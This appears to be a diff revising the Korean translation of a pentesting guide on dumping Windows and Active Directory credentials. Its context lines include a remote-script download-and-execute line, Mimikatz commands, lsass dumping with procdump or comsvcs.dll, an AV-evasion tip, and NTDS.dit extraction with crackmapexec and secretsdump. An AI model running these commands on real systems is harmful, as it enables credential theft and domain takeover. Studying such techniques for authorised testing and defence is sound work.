@@ -37,9 +37,9 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
-[**여기에서 일부 가능한 자격 증명 보호에 대해 알아보세요.**](credentials-protections.md) **이 보호 기능은 Mimikatz가 일부 자격 증명을 추출하는 것을 방지할 수 있습니다.**
+[**여기에서 가능한 자격 증명 보호에 대해 알아보세요.**](credentials-protections.md) **이 보호 기능은 Mimikatz가 일부 자격 증명을 추출하는 것을 방지할 수 있습니다.**
 
-## Meterpreter를 통한 자격 증명
+## Meterpreter로 자격 증명
 
 내가 만든 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)을 사용하여 **희생자의 내부에서 비밀번호와 해시를 검색하세요.**
 ```bash
@@ -62,8 +62,8 @@ mimikatz_command -f "lsadump::sam"
 
 ### Procdump + Mimikatz
 
-**SysInternals의 Procdump는** [**합법적인 Microsoft 도구**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **이므로** Defender에 의해 탐지되지 않습니다.\
-이 도구를 사용하여 **lsass 프로세스를 덤프하고**, **덤프를 다운로드**하며 **덤프에서 자격 증명을 로컬로 추출**할 수 있습니다.
+**SysInternals의 Procdump는** [**정상적인 Microsoft 도구**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **이기 때문에 Defender에 의해 탐지되지 않습니다.**\
+이 도구를 사용하여 **lsass 프로세스를 덤프하고**, **덤프를 다운로드하며**, **덤프에서 자격 증명을 로컬로 추출**할 수 있습니다.
 
 {% code title="Dump lsass" %}
 ```bash
@@ -84,7 +84,7 @@ mimikatz # sekurlsa::logonPasswords
 ```
 {% endcode %}
 
-이 과정은 [SprayKatz](https://github.com/aas-n/spraykatz)로 자동으로 수행됩니다: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+이 과정은 [SprayKatz](https://github.com/aas-n/spraykatz)를 사용하여 자동으로 수행됩니다: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
 **참고**: 일부 **AV**는 **procdump.exe를 사용하여 lsass.exe를 덤프하는 것**을 **악성**으로 **탐지**할 수 있습니다. 이는 **"procdump.exe"와 "lsass.exe"** 문자열을 **탐지**하기 때문입니다. 따라서 **lsass.exe의 PID**를 procdump에 **인수로 전달하는 것이** **더 은밀합니다.**
 
@@ -103,10 +103,10 @@ rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 
 ### **작업 관리자를 사용하여 lsass 덤프하기**
 
-1. 작업 표시줄을 마우스 오른쪽 버튼으로 클릭하고 작업 관리자를 클릭합니다.
-2. 자세히 보기 클릭
-3. 프로세스 탭에서 "로컬 보안 권한 프로세스"를 검색합니다.
-4. "로컬 보안 권한 프로세스"를 마우스 오른쪽 버튼으로 클릭하고 "덤프 파일 만들기"를 클릭합니다.
+1. 작업 표시줄에서 마우스 오른쪽 버튼을 클릭하고 작업 관리자를 클릭합니다.
+2. 자세히 보기를 클릭합니다.
+3. 프로세스 탭에서 "로컬 보안 권한 프로세스" 프로세스를 검색합니다.
+4. "로컬 보안 권한 프로세스" 프로세스에서 마우스 오른쪽 버튼을 클릭하고 "덤프 파일 만들기"를 클릭합니다.
 
 ### procdump를 사용하여 lsass 덤프하기
 
@@ -150,7 +150,7 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
-### NTDS.dit 계정마다 pwdLastSet 속성 표시
+### 각 NTDS.dit 계정에 대한 pwdLastSet 속성 표시
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
@@ -205,15 +205,15 @@ $voume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
-## **Active Directory Credentials - NTDS.dit**
+## **Active Directory 자격 증명 - NTDS.dit**
 
 **NTDS.dit** 파일은 **Active Directory**의 핵심으로, 사용자 객체, 그룹 및 그들의 멤버십에 대한 중요한 데이터를 보유하고 있습니다. 도메인 사용자의 **비밀번호 해시**가 저장되는 곳입니다. 이 파일은 **Extensible Storage Engine (ESE)** 데이터베이스이며 **_%SystemRoom%/NTDS/ntds.dit_**에 위치합니다.
 
 이 데이터베이스 내에는 세 가지 주요 테이블이 유지됩니다:
 
-- **Data Table**: 이 테이블은 사용자 및 그룹과 같은 객체에 대한 세부 정보를 저장하는 역할을 합니다.
-- **Link Table**: 그룹 멤버십과 같은 관계를 추적합니다.
-- **SD Table**: 각 객체에 대한 **보안 설명자**가 여기에 저장되어, 저장된 객체에 대한 보안 및 접근 제어를 보장합니다.
+- **데이터 테이블**: 이 테이블은 사용자 및 그룹과 같은 객체에 대한 세부 정보를 저장하는 역할을 합니다.
+- **링크 테이블**: 그룹 멤버십과 같은 관계를 추적합니다.
+- **SD 테이블**: 각 객체에 대한 **보안 설명자**가 여기에 저장되어, 저장된 객체에 대한 보안 및 접근 제어를 보장합니다.
 
 자세한 정보는 다음을 참조하세요: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
@@ -248,17 +248,17 @@ You can also **extract them automatically** using a valid domain admin user:
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
-For **big NTDS.dit files**는 [gosecretsdump](https://github.com/c-sto/gosecretsdump)를 사용하여 추출하는 것이 권장됩니다.
+**큰 NTDS.dit 파일**의 경우 [gosecretsdump](https://github.com/c-sto/gosecretsdump)를 사용하여 추출하는 것이 권장됩니다.
 
 마지막으로, **metasploit 모듈**: _post/windows/gather/credentials/domain\_hashdump_ 또는 **mimikatz** `lsadump::lsa /inject`를 사용할 수도 있습니다.
 
 ### **NTDS.dit에서 SQLite 데이터베이스로 도메인 객체 추출하기**
 
-NTDS 객체는 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)를 사용하여 SQLite 데이터베이스로 추출할 수 있습니다. 비밀뿐만 아니라 전체 객체와 그 속성도 추출되어 원시 NTDS.dit 파일이 이미 검색된 경우 추가 정보 추출을 위해 사용됩니다.
+NTDS 객체는 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)를 사용하여 SQLite 데이터베이스로 추출할 수 있습니다. 비밀뿐만 아니라 전체 객체와 그 속성도 추출되어 원시 NTDS.dit 파일이 이미 검색된 경우 추가 정보 추출을 위한 자료로 사용됩니다.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-The `SYSTEM` 하이브는 선택 사항이지만 비밀 복호화를 허용합니다 (NT 및 LM 해시, 일반 텍스트 비밀번호, kerberos 또는 신뢰 키와 같은 보조 자격 증명, NT 및 LM 비밀번호 기록). 다른 정보와 함께 다음 데이터가 추출됩니다: 해시가 있는 사용자 및 머신 계정, UAC 플래그, 마지막 로그온 및 비밀번호 변경의 타임스탬프, 계정 설명, 이름, UPN, SPN, 그룹 및 재귀적 멤버십, 조직 단위 트리 및 멤버십, 신뢰 유형, 방향 및 속성이 있는 신뢰된 도메인...
+`SYSTEM` 하이브는 선택 사항이지만 비밀 복호화를 허용합니다 (NT 및 LM 해시, 일반 텍스트 비밀번호, kerberos 또는 신뢰 키와 같은 보조 자격 증명, NT 및 LM 비밀번호 기록). 다른 정보와 함께 다음 데이터가 추출됩니다: 해시가 있는 사용자 및 머신 계정, UAC 플래그, 마지막 로그온 및 비밀번호 변경의 타임스탬프, 계정 설명, 이름, UPN, SPN, 그룹 및 재귀적 멤버십, 조직 단위 트리 및 멤버십, 신뢰 유형, 방향 및 속성이 있는 신뢰된 도메인...
 
 ## Lazagne
 
@@ -289,7 +289,7 @@ type outpwdump
 ```
 ### PwDump7
 
-다음에서 다운로드하세요: [ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) 그리고 **실행하면** 비밀번호가 추출됩니다.
+다음에서 다운로드하세요: [ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) 그리고 **실행하기만 하면** 비밀번호가 추출됩니다.
 
 ## Defenses
 
